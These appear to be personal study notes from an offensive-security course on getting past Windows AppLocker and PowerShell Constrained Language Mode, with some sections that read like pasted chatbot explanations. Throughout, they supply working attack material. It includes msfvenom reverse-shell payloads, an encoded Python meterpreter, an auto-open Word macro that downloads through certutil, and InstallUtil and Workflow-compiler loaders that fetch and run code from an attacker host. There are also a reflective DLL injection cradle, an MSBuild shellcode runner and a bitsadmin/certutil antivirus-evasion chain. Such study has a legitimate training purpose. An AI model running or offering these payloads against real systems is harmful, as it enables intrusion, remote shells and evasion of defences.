### Application Whitelisting Theory

- `PsSetCreateProcessNotifyRoutineEx` is a MS kernel-mode API that registers a notification callback allowing the system to determine if the process may run
- **Applocker** helps control what applications can run on a system
	- By default, AppLocker policy only applies to code launched in a user's context. On Windows 10, Windows 11, and Windows Server 2016 or later, you can apply AppLocker policy to non-user processes, including those running as SYSTEM.
- **AppLocker** is included with all editions of Windows except Windows 10 version 1809 or earlier.
- Another whitelisting solution was introduced by MS. Windows Defender Application Control (WDAC) performs whitelisting actions in both user- and kernel-mode
- WDAC was introduced with Windows 10 and allows organizations to control which drivers and applications are allowed to run on their Windows clients.


##### Feature Availability of Applocker and WDAC
- https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/feature-availability

### 8.1.2 Applocker Setup and Rules

##### Rules
- filepath
- file hash (SHA256 Authenticode...code signing)
- digital signature (aka publisher)
	- allows version updates

##### Setup
- In the Local Group Policy Editor, we'll navigate to _Local Computer Policy_ -> _Computer Configuration_ -> _Windows Settings_ -> _Security Settings_ -> _Application Control Policies_ and select the _AppLocker_ item
- Configuration
	- Configure rule enforcement
	- set rule properties for Executable, Windows installer files, scripts, packaged apps

### 8.2 Basic Bypasses

#### 8.2.1 Trusted Folders

- use **AccessChk** from SysInternals to locate user-writable folders
- -w to locate writable directories, -u to suppress any errors and -s to recurse through all subdirectories
```cmd
accesschk.exe "user" C:\Windows -wus
```
- can then use `icacls` to determine directories where can write and execute like `C:\Windows\Tasks`
- another directory that has WD and RX permissions in the lab environment is `c:\windows\system32\spool\drivers\color\`

#### 8.2.2 Bypass with DLLs

- default ruleset doesn't protect against loading arbitrary DLLs
- create an unmanaged DLL like
```c
#include "stdafx.h"
#include <Windows.h>

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void run()
{
	MessageBoxA(NULL, "Execution happened", "Bypass", MB_OK);
}
```
- compile and use `rundll32` tool to execute `rundll32 <path to dll>\name.dll,run`
- GPO Advanced rule to enable DLL enforcement

##### Extra Mile:
- Code signing bypass example: https://forensicitguy.github.io/making-meterpreter-look-google-signed/
- other ways to embed a non-java payload with a signed msi?

Bypassing AppLocker using installer packages is a well-known technique that leverages the trust that AppLocker places in certain signed executables, such as `msiexec.exe` or other installer-related binaries. Here's how this can be done:

### **Understanding AppLocker**

AppLocker is a Windows feature that allows administrators to control which applications and files users can run. AppLocker rules can be applied based on file path, file hash, or publisher. While it's a robust security feature, misconfigurations or inherent trust in certain executables can lead to bypasses.

### **Bypassing AppLocker with Installer Packages**

One of the common methods to bypass AppLocker involves using the Windows Installer (msiexec.exe) or other installer-related binaries that are typically allowed to run by AppLocker due to being signed by Microsoft.

#### **Method 1: Using `msiexec.exe` to Run a Malicious MSI File**

1. **Create a Malicious MSI Package:**
   - You can use tools like **msfvenom** to create an MSI package with a payload.
   - Example using **msfvenom**:
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP> LPORT=<Your Port> -f msi > payload.msi
     ```

2. **Execute the MSI Package with `msiexec.exe`:**
   - Use `msiexec.exe` to run the MSI package:
     ```bash
     msiexec /quiet /i payload.msi
     ```
   - `msiexec.exe` is a trusted binary, and if AppLocker is not configured to block it, this command will execute the MSI, bypassing AppLocker restrictions.

#### **Method 2: Using Unsigned Executables within a Trusted Installer**

1. **Prepare an Executable:**
   - Compile or obtain an unsigned executable that you wish to run on the target system.

2. **Create an MSI Package:**
   - Package the unsigned executable within an MSI using a tool like **WiX Toolset** or **Advanced Installer**.

3. **Run the MSI via `msiexec.exe`:**
   - Execute the MSI using `msiexec.exe` as described above. Since the MSI package is processed by a trusted binary (`msiexec.exe`), AppLocker may allow the unsigned executable within the MSI to run.

#### **Method 3: Exploiting Installers with Custom Actions**

1. **Modify an Existing MSI:**
   - Modify an existing MSI installer to include custom actions that execute your payload.
   - Custom actions can be set up to run arbitrary code during the installation process.

2. **Run the Modified MSI:**
   - Similar to the above methods, execute the MSI using `msiexec.exe` to trigger the custom action and run your payload.

### **Defensive Considerations**

To protect against such bypass techniques:
- **Whitelist by File Hash:** Whitelisting by file hash rather than by path or publisher can prevent trusted binaries from being abused.
- **Audit AppLocker Logs:** Regularly audit AppLocker logs to detect unusual use of installer packages.
- **Restrict Installation Privileges:** Limit the ability of users to execute `msiexec.exe` or other installer binaries unless necessary.
- **Use Device Guard:** Implement additional security controls like Device Guard to restrict code execution more granularly.

### **Conclusion**

Bypassing AppLocker using installer packages is a technique that exploits the trust Windows places in certain binaries like `msiexec.exe`. While effective, this method highlights the importance of robust and carefully configured security controls to mitigate such risks.

Modifying an existing MSI file to include custom actions or payloads can be done using tools like **Orca**, **InstEd**, or **WiX Toolset**. Below, I’ll guide you through the process using Orca, a tool provided by Microsoft, which allows for detailed editing of MSI files.

### **Step-by-Step Guide to Modify an Existing MSI File**

#### **Step 1: Download and Install Orca**

1. **Download Orca:**
   - Orca is part of the Windows SDK. You can download the SDK [here](https://developer.microsoft.com/en-us/windows/downloads/windows-10-sdk/).

2. **Install Orca:**
   - During the SDK installation, select only the **Windows Installer XML (WiX) Toolset** or **Orca** if it is available as a standalone component.

3. **Launch Orca:**
   - After installation, you can find Orca in your Start Menu or by searching `Orca`.

#### **Step 2: Open the MSI File in Orca**

1. **Open Orca:**
   - Launch the Orca tool.

2. **Load the MSI File:**
   - Go to `File > Open` and select the MSI file you want to modify.

#### **Step 3: Modify the MSI File**

1. **Add Custom Actions:**
   - **Navigate to the `CustomAction` table** in Orca. This table defines custom actions that can be executed during the installation process.
   - **Add a new row** with the following details:
     - **Action**: Name your custom action (e.g., `RunPayload`).
     - **Type**: Define the type of action (e.g., `307` for executing a command).
     - **Source**: Path to the executable or script.
     - **Target**: The command to be executed.

2. **Modify the `InstallExecuteSequence` Table:**
   - **Navigate to the `InstallExecuteSequence` table**.
   - **Add a new row** or modify an existing one to include your custom action.
     - **Action**: Name of your custom action (must match the one in `CustomAction` table).
     - **Condition**: When the action should be executed (leave empty for always).
     - **Sequence**: The order in which the action should be executed during the installation.

3. **Inject a Payload (if applicable):**
   - If you’re adding a payload (e.g., an executable), you can either:
     - **Embed it in the MSI:**
       - Add it to the `Binary` table, then reference it in the `CustomAction` table.
     - **Download or execute it externally:**
       - Use a `CustomAction` to run a command that downloads or executes the payload.

#### **Step 4: Save the Modified MSI**

1. **Save the Changes:**
   - After making your modifications, save the MSI file.
   - Go to `File > Save As`, and save the modified MSI with a new name to avoid overwriting the original.

#### **Step 5: Test the Modified MSI**

1. **Test the Installation:**
   - Run the modified MSI file on a test machine to ensure that the modifications work as expected.

2. **Monitor the Installation:**
   - Use tools like Process Monitor, Event Viewer, or simply watch the directories to see if your custom actions are executed correctly.

### **Important Notes**

- **Legal and Ethical Considerations:** Modifying MSI files, especially to inject malicious code, can have legal and ethical implications. Ensure you have proper authorization to modify the software.
- **Digital Signatures:** Modifying an MSI file will break its digital signature. If the MSI is signed, the user may receive a warning during installation unless it’s re-signed.
- **Testing:** Always thoroughly test modified MSI files in a controlled environment before deploying them in production.

This process provides a basic overview of how to modify an existing MSI file. More complex modifications might require in-depth knowledge of the MSI format and the Windows Installer service.

Windows Installer default rules, especially when enforced by tools like AppLocker or Software Restriction Policies (SRP), are designed to control which applications can run on a Windows system. Understanding these default rules is key to both securing your environment and understanding potential bypass techniques.

### **Default Windows Installer Rules**

Windows Installer rules in AppLocker or SRP typically permit the execution of the following:

1. **Trusted Installers (`msiexec.exe`):**
   - The `msiexec.exe` binary, which is part of the Windows Installer service, is usually allowed by default because it is a system file signed by Microsoft. This executable is responsible for installing, modifying, and removing applications that are packaged as MSI files.

2. **Programs Installed in Program Files and Windows Directory:**
   - Executables located in trusted directories like `C:\Program Files`, `C:\Program Files (x86)`, and `C:\Windows` are usually allowed to run because these directories are trusted locations.

3. **Publisher Rules:**
   - Applications signed by trusted publishers, especially Microsoft, may be allowed to run based on their digital signature.

4. **Path Rules:**
   - Certain paths may be explicitly allowed, permitting executables within these directories to run.

### **Potential Bypass Techniques**

Given the above default rules, several bypass techniques can be employed if the AppLocker or SRP configuration is not stringent enough:

#### **1. Using `msiexec.exe` to Execute Malicious MSI Files**

- **Technique:** Since `msiexec.exe` is a trusted executable, attackers can create a malicious MSI package that contains a payload. Running this package via `msiexec.exe` would execute the payload.
  
  ```powershell
  msiexec /quiet /i payload.msi
  ```

- **Why It Works:** AppLocker and SRP might trust `msiexec.exe` by default and allow it to run any MSI package, even if the package itself is malicious.

#### **2. Dropping Executables in Trusted Directories**

- **Technique:** An attacker with write access to a trusted directory (like `C:\Program Files` or `C:\Windows\Temp`) could drop an executable there, which would then be allowed to run by default.
  
  - **Example:** Dropping a payload in `C:\Windows\Temp\malware.exe` and executing it.

- **Why It Works:** These directories are typically allowed by default, assuming that anything within them is trusted.

#### **3. DLL Hijacking**

- **Technique:** AppLocker and SRP primarily focus on executable files (`.exe`), but they might not control DLLs as strictly. An attacker could replace or inject a malicious DLL into a location where a trusted executable will load it.

  - **Example:** Placing a malicious `msvcrt.dll` in the same directory as a trusted application that will load it at runtime.

- **Why It Works:** If the directory containing the DLL is trusted, the application will load it, potentially allowing the attacker to execute arbitrary code.

#### **4. Exploiting Allowed Scripts or Macros**

- **Technique:** If scripts like PowerShell or VBScript are allowed, an attacker could run malicious scripts that bypass AppLocker rules. Similarly, Office macros, if allowed, can be exploited to execute malicious code.

  - **Example:** A PowerShell script that downloads and executes a payload.

  ```powershell
  powershell -ExecutionPolicy Bypass -File script.ps1
  ```

- **Why It Works:** AppLocker might allow script engines like `powershell.exe` or `cscript.exe` by default.

#### **5. Utilizing Trusted Publisher Signing**

- **Technique:** If AppLocker allows binaries signed by a trusted publisher, an attacker might find or create a signed binary (even if it's from a third party) that performs unintended actions.

  - **Example:** Using a legitimate signed executable that can be coerced into running a malicious DLL or script.

- **Why It Works:** The focus is on the publisher's signature, not on the behavior of the executable.

#### **6. In-Memory Execution**

- **Technique:** Some tools and scripts can execute code directly in memory without dropping an executable to disk, thereby bypassing AppLocker or SRP.

  - **Example:** Tools like `PowerShell`, `Cobalt Strike`, or `Reflective DLL Injection` techniques can execute code in memory.

- **Why It Works:** Since there's no physical file to check, AppLocker rules don't apply.

### **Defensive Measures**

To protect against these bypass techniques:

1. **Enforce Strict AppLocker Rules:**
   - Use hash or certificate rules instead of path rules where possible.
   - Monitor and restrict the use of `msiexec.exe` and other trusted installer binaries.
   - Implement rules that cover not only executables but also scripts, DLLs, and other potential attack vectors.

2. **Limit Write Access to Trusted Directories:**
   - Ensure that only trusted administrators have write access to directories like `C:\Windows` and `C:\Program Files`.

3. **Use Windows Defender Application Control (WDAC):**
   - WDAC provides more granular control over what can run on your systems, including DLLs and scripts, and can be a more secure alternative to AppLocker.

4. **Regular Auditing:**
   - Continuously audit the execution of installers and other high-risk binaries, looking for anomalies or signs of misuse.

5. **Disable Macros and Unnecessary Scripting Languages:**
   - If possible, disable or restrict the use of macros, PowerShell, and other scripting engines.

By understanding these default rules and potential bypasses, you can better secure your environment against these attack vectors.

#### 8.2.3 Alternate Data Streams

- **Alternate Data Stream (ADS)** is a binary file attribute that contains metadata
- can use this to append additional information to the original file
- Find a file in a trusted location that is writeable and executable
	- *TODO:* write a cmd script that finds files with these attributes
- Use `type` command to copy malicious content into an ADS
	- Example: `type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"`
	- use `wscript` and specify the ADS to get code execution

#### 8.2.4 Third Party Execution

- Check for 3rd party scripting engines (Perl, Python, etc...)
- "Even more interesting is the lack of enforcement against VBA code inside Microsoft Office documents. If a Microsoft Office document is saved to a non-whitelisted folder, AppLocker cannot restrict execution of its embedded macros, allowing for reuse of our previously developed tradecraft. This highlights the usefulness of Office documents in client-side attacks."

#### Python
```shell
msfvenom -p python/meterpreter/reverse_https LHOST=192.168.45.188 LPORT=443 EXITFUNC=thread -f raw
[-] No platform was selected, choosing Msf::Module::Platform::Python from the payload
[-] No arch selected, selecting arch: python from the payload
No encoder specified, outputting raw payload
Payload size: 704 bytes
exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNpNUW1r2zAQ/hz/Cn2zNDz5tWmaokEJabuSJaXJNmgIwrGUWVS2Up3tJh3775UTBhVCp3ueu+O5O1XtjW3Qu1bbYJuDHGYBHMHrFHOGdtKCMjVX9c54rWacq1M85/hvMvZbq11e4gfp/z+18rWV0Pj/1p1aR5tNsLOm0goatva3rdKCm72spfUD/361elze57XQzt0QrwS23nhqh/AplbEEORJ16hvDSXAZXBGCjD37aZAFKRl7g7MeBKC9ARTMWbpcziambuShwb37+LRYLSaLGXd4l6Skj6NFKYsXXhpo6ryS7DbXIE+E61jtjrwyQp6KTaZPKz5fzKfeoASa7514gVtNP4vHUQAFIZ5hjvjcJP5SgoNpLkQpc+GGydbY/wnSfr35I+vGDeGHeVda5+EFjRD+rWph3gDNVyiOaHSNHDDMrtGhf2w3jpOMRgTdOe0mTKI4cjdGt8rKnTmEJ9YnG08eZIH7jVIhC1PtrQTA5+XS7TDrQSGxob1I7JdNs4dxGMZXCY2HI5pd0Hg0GmdZGr7MHkbP6XQYVfHDVL/dzTLgzzdQTr7/kkefuGXnAhN3vA9v4LoD')[0])))

```
- copy the payload and create a file named shell.py
- shell.py add `import base64` along with the output of `msfvenom`

### 8.3 Bypassing Applocker with Powershell

#### Powershell language modes

PowerShell's language modes determine what scripts and commands can be executed in a given session. There are four primary language modes:

1. **Full Language Mode**:
    - **Description**: This mode provides full access to the PowerShell language. Users can run all cmdlets, functions, scripts, and access the .NET Framework.
    - **Restrictions**: None.
    - **Usage**: Suitable for administrators and trusted users who need full control.

2. **Constrained Language Mode**:
    - **Description**: This mode restricts some scripting capabilities, primarily to enhance security and prevent potentially malicious scripts from running.
    - **Restrictions**:
        - .NET types and methods are restricted to a safe list.
        - Only core cmdlets and functions are allowed.
        - No access to COM objects.
        - Limited access to the .NET Framework.
    - **Bypass**: To switch to Full Language Mode, a user with administrative privileges can change the execution policy using the `Set-ExecutionPolicy` cmdlet.

3. **Restricted Language Mode**:
    - **Description**: The most restricted mode, primarily used in environments like Just Enough Administration (JEA) to tightly control what scripts and commands can be executed.
    - **Restrictions**:
        - No user-defined functions, scripts, or workflows.
        - Only a subset of cmdlets and functions allowed.
        - No access to the .NET Framework or COM objects.
    - **Bypass**: Generally, cannot be bypassed directly. Administrators would need to reconfigure the session's language mode.

4. **NoLanguage Mode**:
    - **Description**: This mode completely disables the PowerShell scripting language. Only allowed cmdlets and functions can be executed.
    - **Restrictions**:
        - No script blocks, variables, functions, aliases, or expressions.
        - Only a predefined list of cmdlets and functions is allowed.
    - **Bypass**: Switching out of NoLanguage Mode requires administrative privileges to reconfigure the language mode.

### Changing Language Modes

Language modes are typically enforced in specific PowerShell sessions or environments. Here’s how you can change the language mode for a session:

```powershell
# To change the language mode, you need to update the LanguageMode property of the session state
$ExecutionContext.SessionState.LanguageMode = "FullLanguage"
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
$ExecutionContext.SessionState.LanguageMode = "RestrictedLanguage"
$ExecutionContext.SessionState.LanguageMode = "NoLanguage"
```

### Security Considerations

- **Full Language Mode**: Should be used with caution and restricted to trusted users and environments due to its unrestricted capabilities.
- **Constrained Language Mode**: Provides a balance between usability and security, making it suitable for less trusted environments.
- **Restricted and NoLanguage Modes**: Offer the highest levels of security and are ideal for tightly controlled administrative environments.

### Summary

PowerShell's language modes are crucial for controlling script execution and maintaining security in various environments. Understanding each mode's restrictions and capabilities helps in configuring PowerShell sessions appropriately based on security requirements.


### 8.3.2. Custom Runspaces

#### C\# App to create a Runspace to bypass Powershell constraints

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

\\ Note: need to add this dll into Reference Assemblies
\\C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll.

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
			ps.Runspace = rs;
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
			ps.AddScript(cmd);
			ps.Invoke();
			rs.Close();
        }
    }
}
```

- Can change the cmd string to perform actions like
	- run PowerUp from a web cradle
	- shellcode execution
- *Note:* need to verify that Applocker isn't blocking. Placing the .exe in c:\\windows\\tasks or another directory where the user and write and execute is required if Applocker or other whitelist blocking is enabled.

### 8.3.3. PowerShell CLM Bypass

`InstallUtil.exe` is a command-line utility that is part of the .NET Framework. It is primarily used for installing and uninstalling .NET assemblies, typically for Windows Services. However, like many legitimate tools, `InstallUtil.exe` can be abused by attackers for malicious purposes. Here are several ways in which `InstallUtil.exe` can be abused:

### 1. **Execution of Malicious Code**
Attackers can create a .NET assembly with custom code in the `Install` and `Uninstall` methods. When `InstallUtil.exe` is run against this assembly, it will execute the malicious code contained in these methods.

#### Example:
A simple .NET assembly with malicious code in the `Install` method:
```csharp
using System;
using System.ComponentModel;
using System.Configuration.Install;
using System.Diagnostics;

namespace MaliciousCode
{
    [RunInstaller(true)]
    public class MaliciousInstaller : Installer
    {
        public override void Install(IDictionary stateSaver)
        {
            base.Install(stateSaver);
            Process.Start("cmd.exe"); // or any other malicious command
        }

        public override void Uninstall(IDictionary savedState)
        {
            base.Uninstall(savedState);
            Process.Start("cmd.exe"); // or any other malicious command
        }
    }
}
```
Compile this code into an assembly, and then run it using `InstallUtil.exe`:
```
InstallUtil.exe MaliciousCode.dll
```
POC to bypass Powershell CLM:
```
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            ps.AddScript(cmd);

            ps.Invoke();

            rs.Close();
        }
    }
}
```
To run the code: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe`
### 2. **Bypassing Application Whitelisting**
Since `InstallUtil.exe` is a legitimate Microsoft-signed binary, it is often whitelisted by application whitelisting solutions. Attackers can exploit this to execute their payloads without triggering alarms.

### 3. **Fileless Malware**
`InstallUtil.exe` can be used to load and execute code directly from memory, which can be part of a fileless malware attack, making it harder for traditional antivirus solutions to detect.

### 4. **Persistence Mechanism**
Attackers can use `InstallUtil.exe` to ensure their malicious code is executed upon system reboots or service restarts by installing it as a service.

### Detection and Mitigation
1. **Monitoring and Logging:** Monitor the execution of `InstallUtil.exe` with tools like Sysmon or Endpoint Detection and Response (EDR) solutions. Look for unusual usage patterns or executions from unexpected directories.
2. **Application Whitelisting:** Configure whitelisting solutions to allow `InstallUtil.exe` only when it is invoked by legitimate software installation processes.
3. **Code Signing:** Enforce code signing for all scripts and binaries executed in your environment.
4. **Endpoint Protection:** Use endpoint protection solutions that can detect and prevent the execution of malicious payloads, even those executed by legitimate tools.

### Example of Detection Rule
A sample YARA rule to detect unusual usage of `InstallUtil.exe`:
```yara
rule Suspicious_InstallUtil_Usage
{
    meta:
        description = "Detects unusual usage of InstallUtil.exe"
    strings:
        $s1 = "InstallUtil.exe"
        $s2 = "-install" // commonly used flag with InstallUtil
    condition:
        all of them
}
```

In summary, while `InstallUtil.exe` is a useful utility for legitimate administrative tasks, it can be exploited by attackers to execute malicious code, bypass security controls, and maintain persistence. Proper monitoring, logging, and security configurations are essential to detect and mitigate such abuses.

#### CLM Bypass Process

- Using Bypass.exe as developed in the course material
- *Issues:*
	- have to download the exe
	- ensure the exe is not flagged by AV/EDR
- Bypass AV obfuscate the exe during download by base64 encoding it either on a separate Windows machine or Linux (might need to pipe to iconv if on Linux)
```cmd
certutil -encode C:\<path to exe> <filename>.txt
```
- Powershell command to encode, but certutil will make the exe look more like a security certificate
```powershell
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\<path to exe>")) > C:<path to text ouput file>
```
- To transfer the encoded exe to the victim machine, one can use `bitsadmin` rather than `certutil` which will trigger an AV scan
```cmd
bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file>
```
- Now decode the encoded  file
```cmd
certutil -decode encoded.txt Bypass.exe
```
- Then run
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```
- As a one-liner:
```cmd 
bitsadmin /Transfer myJob http://<ip>/file.txt C:<path to save encoded file> &&certutil -decode encoded.txt Bypass.exe && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U Bypass.exe
```

- Macro to use whitelisting bypass and launches a powershell shellcode runner
- run code as 32-bit

```vb
SSub MyMacro()

Dim wsh As Object


strArg = "certutil -urlcache -f http://192.168.45.188:8000/CustomRunspaces.exe c:\users\student\CustomRunspaces.exe"
strArg2 = "certutil -decode c:\users\student\bypass.txt c:\users\student\bypass.exe"
strArg3 = "cmd /c del c:\users\student\bypass.txt"
strArg4 = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\users\student\CustomRunspaces.exe"

Set wsh = CreateObject("WScript.Shell")
wsh.Run strArg, 0, True
wsh.Run strArg4, 0, True


End Sub


Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub



```

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CustomRunspaces
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method which is a decoy");
        }

    }

    [System.ComponentModel.RunInstaller(true)]
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            String cmd = ("IEX(New-Object Net.WebClient).downloadString('http://192.168.45.188:8000/shellcode-runner.ps1')");
            ps.AddScript(cmd);

            ps.Invoke();
            rs.Close();

        }
    }

}
```
### 8.3.4. Reflective Injection Returns

- using a 64-bit Meterpreter dll and the `Invoke-ReflectivePEInjection.ps1` script to obtain a reverse shell and bypass Applocker DLL rules
```cmd
String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
```

## 8.4. Bypassing AppLocker with C\#

##### 8.4.2

- Use Microsoft.Workflow.Compiler.exe to generate an xml file that will compile and run code in a file (here we name test.txt)
- M.W.C.exe takes two arguments
	- First is path to an xml file with compiler flags
	- Path to file containing C# code
- allow compile and load into memory without restrictions
- C# code must contain a class that inherits from the System.Workflow.ComponentModel namespace (eg `public class Run : Activty`)
```powershell
$workflowexe = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe"
$workflowasm = [Reflection.Assembly]::LoadFrom($workflowexe)
$SerializeInputToWrapper = [Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper', [Reflection.BindingFlags] 'NonPublic, Static')
Add-Type -Path 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Workflow.ComponentModel.dll'
$compilerparam = New-Object -TypeName Workflow.ComponentModel.Compiler.WorkflowCompilerParameters
$compilerparam.GenerateInMemory = $True
$pathvar = "test.txt"
$output = "C:\Tools\run.xml"
$tmp = $SerializeInputToWrapper.Invoke($null, @([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters] $compilerparam, [String[]] @(,$pathvar)))
Move-Item $tmp $output
$Acl = Get-ACL $output;$AccessRule= New-Object System.Security.AccessControl.FileSystemAccessRule(“student”,”FullControl”,”none”,”none","Allow");$Acl.AddAccessRule($AccessRule);Set-Acl $output $Acl
```
- contents of test.txt
```csharp
using System;
using System.Workflow.ComponentModel;
public class Run : Activity{
    public Run() {
        Console.WriteLine("I executed!");
    }
}
```

```powershell
C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe run.xml results.xml
```

##### 8.4.5.1
1. Used my code `ApplockerPowershellBypass.exe` to generate the xml file needed (run.xml). This wasn't the method used in the course as `run.xml` was generated by an admin user.
2. Many steps to get this working
	1. SharpUp main method add public
	2. needed to change xoml.ps1 code to add some dlls (not sure if this was needed)
	3. C# code to download SharpUp assembly and execute in memory

```csharp
using System;
using System.Net;
using System.IO;
using System.Reflection;
using System.Workflow.ComponentModel;

public class Run : Activity
{
    public Run()
    {
        Console.WriteLine("I executed!");
        
        // Download SharpUp.exe directly into memory
        string url = "http://192.168.45.188:8000/SharpUp.exe";
        byte[] exeBytes;
        using (WebClient client = new WebClient())
        {
            exeBytes = client.DownloadData(url);
        }

        // Load SharpUp.exe into memory
        Assembly assembly = Assembly.Load(exeBytes);

        // Execute SharpUp with "audit" argument
        Type programType = assembly.GetType("SharpUp.Program");
        MethodInfo mainMethod = programType.GetMethod("Main", BindingFlags.Static | BindingFlags.Public);

        using (StringWriter sw = new StringWriter())
        {
            Console.SetOut(sw);
            mainMethod.Invoke(null, new object[] { new string[] { "audit" } });
            string output = sw.ToString();

            // Store output in C:\Tools
            File.WriteAllText(@"C:\Tools\SharpUp_output.txt", output);
        }
    }
}
```

#### Using MSBuild.exe
- References: https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
         <!-- This inline task executes shellcode. -->
         <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
         <!-- Save This File And Execute The Above Command -->
         <!-- Author: Casey Smith, Twitter: @subTee -->
         <!-- License: BSD 3-Clause -->
	  <Target Name="Hello">
	    <ClassExample />
	  </Target>
	  <UsingTask
	    TaskName="ClassExample"
	    TaskFactory="CodeTaskFactory"
	    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
	    <Task>
	    
	      <Code Type="Class" Language="cs">
	      <![CDATA[
		using System;
		using System.Runtime.InteropServices;
		using Microsoft.Build.Framework;
		using Microsoft.Build.Utilities;
		public class ClassExample :  Task, ITask
		{         
		  private static UInt32 MEM_COMMIT = 0x1000;          
		  private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
		  [DllImport("kernel32")]
		    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
		    UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
		  [DllImport("kernel32")]
		    private static extern IntPtr CreateThread(            
		    UInt32 lpThreadAttributes,
		    UInt32 dwStackSize,
		    UInt32 lpStartAddress,
		    IntPtr param,
		    UInt32 dwCreationFlags,
		    ref UInt32 lpThreadId           
		    );
		  [DllImport("kernel32")]
		    private static extern UInt32 WaitForSingleObject(           
		    IntPtr hHandle,
		    UInt32 dwMilliseconds
		    );          
		  public override bool Execute()
		  {
			//replace with your own shellcode
		    byte[] shellcode = new byte[] { 0xfc,...,0xd5 };
		      
		      UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
			MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		      Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
		      IntPtr hThread = IntPtr.Zero;
		      UInt32 threadId = 0;
		      IntPtr pinfo = IntPtr.Zero;
		      hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
		      WaitForSingleObject(hThread, 0xFFFFFFFF);
		      return true;
		  } 
		}     
	      ]]>
	      </Code>
	    </Task>
	  </UsingTask>
	</Project>
```

- Can build and execute using MSBuild
```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\bad.xml
```

##### 8.4.4.1

1. Solution was generating the xml was to create a cs program called ApplockerPowershellBypass and a Powershell script called xoml.ps1.
	1. Uploaded ApplockerPowershellBypass to victim machine
	2. copy ApplockerPowershellBypass to C:\\Windows\\Tasks
	3. host xoml.ps1 on attacker web server
	4. Run `C:\Windows\TasksApplockerPowershellBypass.exe`
	5. xml file now generated
2. Add variable to script and generate new xml

### JScript

`mshta.exe` is a legitimate Windows utility used to execute Microsoft HTML Application (HTA) files. HTA files are essentially HTML documents that have the `.hta` file extension and can run JavaScript, VBScript, or other scripting languages in a standalone window without the restrictions typically placed on scripts running within a web browser.

#### Common Uses of `mshta.exe`
- **Executing HTA Files**: The primary purpose of `mshta.exe` is to open and run HTA files.
- **Running Inline Scripts**: It can also be used to execute scripts directly from the command line.
- **Embedding in HTML**: Often used to create interactive web applications with a greater degree of control over the user interface and system resources than is typically available through standard web pages.

#### Syntax
```sh
mshta.exe <path_to_htafile>
```
Or to execute inline scripts:
```sh
mshta.exe vbscript:Execute("MsgBox(\"Hello World\")")
```

#### Security Considerations
